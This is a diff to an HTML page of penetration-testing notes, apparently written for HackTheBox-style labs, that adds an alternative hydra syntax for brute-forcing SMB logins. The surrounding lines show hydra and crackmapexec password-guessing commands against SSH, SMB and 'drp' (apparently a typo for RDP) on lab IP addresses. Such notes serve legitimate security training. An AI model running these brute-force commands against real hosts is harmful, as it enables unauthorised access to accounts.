@@ -298,7 +298,9 @@ crackmapexec ssh 10.10.10.184 -u USERNAME -p passwords.txt</code></pre>
                     <p>Other examples with hydra</p>
                     <pre><code class="language-bash">hydra -L user.list -P password.list ssh://10.129.42.197
 hydra -L user.list -P password.list drp://10.129.42.197
-hydra -L user.list -P password.list smb://10.129.42.197</code></pre>
+hydra -L user.list -P password.list smb://10.129.42.197
+#Another valid way
+hydra -L user.list -P password.list 10.129.42.197 smb</code></pre>
                    </ul>
                     
 
